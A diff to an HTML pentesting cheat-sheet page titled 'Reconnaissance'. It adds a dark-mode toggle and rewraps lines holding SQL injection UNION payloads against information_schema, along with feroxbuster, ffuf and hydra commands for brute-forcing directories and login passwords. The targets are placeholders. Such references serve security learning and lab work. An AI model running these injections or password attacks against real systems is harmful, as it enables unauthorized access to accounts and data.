@@ -12,8 +12,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 </head>
 
-<body>
-
+<body onload="themeOnLoad()">
     <container class="container">
         <div id="app">
             <!--Mobile Nav Bar-->
@@ -47,6 +46,19 @@
                             <a href="about.html" class="button is-warning is-medium is-hidden-tablet">
                                 About
                             </a>
+                            <!-- Dark mode toggle -->
+                            <div class="mode-switch is-hidden-tablet" style="padding-top:10px;">
+                                <label class="switch">
+                                    <input class="btn-toggle" type="checkbox" onclick="darkModeTrig()" />
+                                    <span class="slider">
+                                        <svg class="slider-icon" viewbox="0 0 24 24" fill="none" height="20"
+                                            stroke="#000" stroke-linecap="round" stroke-linejoin="round"
+                                            stroke-width="2" width="20" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z" />
+                                        </svg>
+                                    </span>
+                                </label>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -90,14 +102,32 @@
                                 About
                             </a>
                         </li>
+                        <!-- Dark mode toggle -->
+                        <li>
+                            <br>
+                            <div class="mode-switch">
+                                <label class="switch" for="checkbox">
+                                    <input class="btn-toggle" id="checkbox" type="checkbox" onclick="darkModeTrig()" />
+                                    <span class="slider">
+                                        <svg class="slider-icon" viewbox="0 0 24 24" fill="none" height="20"
+                                            stroke="#000" stroke-linecap="round" stroke-linejoin="round"
+                                            stroke-width="2" width="20" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z" />
+                                        </svg>
+                                    </span>
+                                </label>
+                            </div>
+                        </li>
                     </ul>
                 </aside>
 
                 <!--Content-->
                 <div class="container is-fluid">
 
-                    <h1 class="has-text-centered is-size-3" style="padding-top: 50px; padding-bottom: 10px;">Reconnaissance</h1>
-                    <h2 class="has-text-centered is-size-5" style="padding-bottom:30px">Everything start with researching, then process a bit further</h2>
+                    <h1 class="has-text-centered is-size-3" style="padding-top: 50px; padding-bottom: 10px;">
+                        Reconnaissance</h1>
+                    <h2 class="has-text-centered is-size-5" style="padding-bottom:30px">Everything start with
+                        researching, then process a bit further</h2>
                     <!-- Page Menu -->
                     <a href="#h1" class="button is-link is-small is-light is-rounded">NMap</a>
                     <a href="#h3" class="button is-warning is-small is-light is-rounded">SQLMap</a>
@@ -105,7 +135,7 @@
                     <a href="#h9" class="button is-info is-small is-light is-rounded">Gobuster</a>
                     <a href="#h10" class="button is-warning is-small is-light is-rounded">Feroxbuster</a>
                     <a href="#h11" class="button is-danger is-small is-light is-rounded">Ffuf</a>
-                    <a href="#h16" class="button is-info is-small is-light is-rounded">Ffuf</a>
+                    <a href="#h16" class="button is-info is-small is-light is-rounded">Hydra</a>
 
                     <br><br>
                     <!--Command board-->
@@ -159,7 +189,8 @@
                             </button>
                         </div>
                         <div class="message-body" id="c5">
-                            /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="{table name}"
+                            /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns
+                            WHERE table_name="{table name}"
                         </div>
                         <div class="message-header" id="h6">
                             <p>Amalgamate SQL column names into single output</p>
@@ -168,7 +199,8 @@
                             </button>
                         </div>
                         <div class="message-body" id="c6">
-                            /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="{table name}"
+                            /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM
+                            information_schema.columns WHERE table_name="{table name}"
                         </div>
                         <div class="message-header" id="h7">
                             <p>Craft a query</p>
@@ -201,7 +233,8 @@
                             </button>
                         </div>
                         <div class="message-body" id="c10">
-                            ./feroxbuster -u {target} --depth {optional} --wordlist {wordlist} -x {file extension} -H {Include Header} -vv
+                            ./feroxbuster -u {target} --depth {optional} --wordlist {wordlist} -x {file extension} -H
+                            {Include Header} -vv
                         </div>
                     </article>
 
@@ -249,7 +282,8 @@
                             </button>
                         </div>
                         <div class="message-body" id="c15">
-                            ffuf -w {wordlist} -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401
+                            ffuf -w {wordlist} -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php
+                            -fc 401
                         </div>
                     </article>
 
@@ -279,7 +313,8 @@
                             </button>
                         </div>
                         <div class="message-body" id="c18">
-                            hydra -l {username} -P {wordlist} MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+                            hydra -l {username} -P {wordlist} MACHINE_IP http-post-form
+                            "/:username=^USER^&password=^PASS^:F=incorrect" -V
                         </div>
                     </article>
 
